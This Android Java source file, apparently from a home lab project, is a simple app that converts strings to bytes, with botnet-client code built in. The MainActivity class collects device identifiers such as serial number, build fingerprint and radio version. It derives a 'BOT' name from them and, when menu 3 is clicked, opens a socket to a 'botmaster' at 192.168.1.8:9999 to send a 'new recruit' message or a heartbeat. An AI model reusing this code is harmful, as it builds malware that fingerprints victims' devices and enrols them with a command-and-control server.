package helloworld.rolen4lab.lan;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.LinearInterpolator;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.UUID;

// test info

public class MainActivity extends AppCompatActivity {
    public TextView mString2Byte;
    public EditText mPlainString;
    public Button mOnLine;
    public boolean status=false;
    public String localip="127.0.0.1";
    public String botmaster_myname;
    public String various_os = System.getProperty("os.version"); // OS version
    public String various_sdk = android.os.Build.VERSION.SDK;      // API Level
    public String various_device = android.os.Build.DEVICE;           // Device
    public String various_model = android.os.Build.MODEL;            // Model
    public String various_product = android.os.Build.PRODUCT;          // Product
    public String various_serial = Build.SERIAL;
    public String various_board = Build.BOARD;
    public String various_abi = Build.CPU_ABI;
    public String various_brand = Build.BRAND;
    public String various_radiover = Build.getRadioVersion();
    public String various_hw = Build.HARDWARE;
    public String various_fingerprint = Build.FINGERPRINT;
    public String various_total = various_os+various_sdk+various_device+various_model+various_product+various_serial+various_board+various_brand+various_fingerprint+various_hw+various_radiover+various_abi;
    public String bot_username = "BOT" + Integer.toString(Math.abs((various_total.hashCode())));
    public String[] botmaster = {"192.168.1.8","9999","1", "Device name : "+various_device+"Model : "+various_model+"OS : "+various_os+"Product : "+various_product+"SDK : "+various_sdk +" Abi :"+ various_abi +" Brand : "+ various_brand
            + " Fingerprint : "+various_fingerprint + " Hardware : " + various_hw+ " Radio version : " +various_radiover+ "Board : " +various_board+ " Serial : " +various_serial+ " Product : " + various_product, bot_username};


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mString2Byte = (TextView) findViewById(R.id.tv_byte_view);
        mPlainString = (EditText) findViewById(R.id.et_string_to_byte);
        mOnLine = (Button) findViewById(R.id.rb_online);
        Animation animation = new AlphaAnimation(1, 0); // Change alpha from fully visible to invisible
        animation.setDuration(500); // duration - half a second
        animation.setInterpolator(new LinearInterpolator()); // do not alter animation rate
        animation.setRepeatCount(Animation.INFINITE); // Repeat animation infinitely
        animation.setRepeatMode(Animation.REVERSE); // Reverse animation at the end so the button will fade back in
        mOnLine.startAnimation(animation);
        mOnLine.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(final View view) {
                view.clearAnimation();
            }
        });
        File file = new File("myfile");
        FileInputStream myfile = null;
        try {
            myfile = new FileInputStream(file);
            byte filecontent[] = new byte[(int)myfile.available()];
            myfile.read(filecontent);
            String str_content = new String(filecontent);
            mString2Byte.setText(str_content);
            myfile.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        //new GetLocalIP();

    }

    public void GetLocalIP(){
        /*
        DatagramSocket dgsocket = null;

        try {
            DatagramSocket datagramSocket = dgsocket = new DatagramSocket();
            dgsocket.connect(InetAddress.getByName("8.8.8.8"), 1002);
            ipinet = dgsocket.getLocalAddress().getHostAddress();
        } catch (SocketException | UnknownHostException e) {
            e.printStackTrace();
        }
        */
        String ipinet="127.0.0.1";
        ConnectivityManager connectivitymanager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activenetworkInfo = connectivitymanager.getActiveNetworkInfo();
        if (activenetworkInfo != null) {
            mString2Byte.append("Internet available\n"+ipinet+"\n");
            status = true;
            //localip = connectivitymanager.getActiveNetworkInfo().toString();
            localip = ipinet;
        } else {
            mString2Byte.append("Internet NOT available\n");
        }
    }

    private void storeimage(Bitmap bm, String filename){
       /* String dirpath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/tmp8ack";
        File dir = new File(dirpath);
        if (!dir.exists()){
            dir.mkdir();
        }
        File file = new File(dirpath, filename);
        try {
            FileOutputStream fos = new FileOutputStream(file);
        } catch (IOException e){
            e.printStackTrace();
        } */
    }

    void convertPlaintext2Byte(){
        byte[] plain2byte = mPlainString.getText().toString().getBytes();
        // for (i = 0 ; i < plain2byte.length ; i++){
        //    mString2Byte.append(plain2byte[i]);
        mString2Byte.setText("");
        int p2bLength = plain2byte.length;
        int i;
        mString2Byte.append("Array length : "+p2bLength+"\n");
        for (i=0;i<p2bLength;i++){
            mString2Byte.append("Array on place : "+i+"__Value : "+plain2byte[i]+"\n");
        }
        //mString2Byte.setText(Arrays.toString(plain2byte));
    }

    void menu3WasClicked(){
        mString2Byte.append("Check internet connection\n");
                //String result = null;
        for (int i=0 ;i<5 ; i++) {
            mString2Byte.append(botmaster[i]+"\n");
        }
        new transmit().execute(botmaster);
        /*

        GetLocalIP();

        if(status){
            mString2Byte.append("Internet up. Connecting to bot master\n"+localip+"\n");
            //connect2BotMaster();
            //String[] botmaster = {"192.168.1.8", "9999", "1", "Various system info", "bot12" };
            //String result = null;
            //new transmit().execute(botmaster);
            //mString2Byte.append(result);
        }else {
            mString2Byte.append("Internet is down\n");
        }
        */

    }

    void menu5WasClicked(){
        mString2Byte.setText(
                "\n Bot UUID : "+bot_username+
                "\n Device : "+various_device+
                "\n Model : "+various_model+
                "\n Product : "+various_product+
                "\n SDK : "+various_sdk+
                "\n OS : "+various_os+
                "\n Serial num : "+various_serial+
                "\n radio version :" + various_radiover +
                "\n Hardware : "+ various_hw+
                "\n Fingerprint : "+various_fingerprint+
                "\n Brand : "+various_brand+
                "\n Abi : "+various_abi+
                "\n Board : " + various_board+
                "\n");
    }

    void menu4WasClicked(){
        String file_record = mString2Byte.getText().toString();
        String filename = "myfile";
        FileOutputStream outputStream;

        try {
            outputStream = openFileOutput(filename, Context.MODE_PRIVATE);
            outputStream.write(file_record.getBytes());
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public class transmit extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            //String botmaster = strings[];
            String result = "";
            String botmaster_ip = strings[0];
            String botmaster_port = strings[1];
            int botmaster_port_int;
            botmaster_port_int = Integer.parseInt(botmaster_port);
            String botmaster_type = strings[2];
            String botmaster_message = strings[3];
            String botmaster_myname = strings[4];
            String message;
            DataOutputStream dos;
            PrintWriter pw = null;
            Socket s1;
            try {
                s1 = new Socket(botmaster_ip,botmaster_port_int);
                pw = new PrintWriter(s1.getOutputStream());
                if(botmaster_type == "1"){
                    // All info are sent to one message separated with #
                    message = "new recruit#" + botmaster_myname + "#" + botmaster_message;
                    result = "new bot";
                } else {
                    message = "heartbeat#" + botmaster_myname;
                    result = "heartbeat";
                }
                pw.write(message);
                pw.flush();
                pw.close();
                s1.close();
            } catch (IOException ex){
                ex.printStackTrace();
            }
            return result;
        }

        @Override
        protected void onPostExecute(String s) {
        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int itemThatWasClickedId = item.getItemId();
        if (itemThatWasClickedId == R.id.action_convert) {
            Toast.makeText(this, "String 2 byte array", Toast.LENGTH_LONG).show();
            convertPlaintext2Byte();
            return true;
        } else {
            if (itemThatWasClickedId == R.id.action_convertimage) {
                Toast.makeText(this, "Image 2 byte array", Toast.LENGTH_LONG).show();
                //convertImage2Byte();
                return true;
            } else {
                if (itemThatWasClickedId == R.id.action_menu3) {
                    Toast.makeText(this, "Menu 3 was clicked", Toast.LENGTH_LONG).show();
                    menu3WasClicked();
                    return true;
                } else {
                    if (itemThatWasClickedId == R.id.action_menu4) {
                        Toast.makeText(this, "Menu 4 was clicked", Toast.LENGTH_LONG).show();
                        menu4WasClicked();
                        return true;
                    } else {
                        if (itemThatWasClickedId == R.id.action_menu5) {
                            Toast.makeText(this, "Menu 5 was clicked", Toast.LENGTH_LONG).show();
                            menu5WasClicked();
                            return true;
                        }
                    }
                }
            }
        }
            return super.onOptionsItemSelected(item);
    }
    }

